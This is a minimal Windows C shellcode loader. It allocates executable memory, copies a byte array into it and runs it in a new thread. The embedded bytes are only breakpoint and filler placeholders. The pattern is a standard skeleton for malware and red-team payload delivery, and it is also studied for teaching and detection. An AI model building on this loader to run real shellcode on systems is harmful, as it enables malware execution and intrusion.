#include <windows.h>

int main()
{

	char shellcode[] = "\xcc\xcc\xcc\xcc\x41\x41\x41\x41";

	// Alloc Memory
	LPVOID addressPointer = VirtualAlloc(NULL, sizeof(shellcode), 0x3000, 0x40);
	// copy shellcode
	RtlMoveMemory(addressPointer, shellcode, sizeof(shellcode));
	// Create Thread
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, 0);
	// sleep for a second to wait for the thread
	Sleep(1000);
	return 0;
}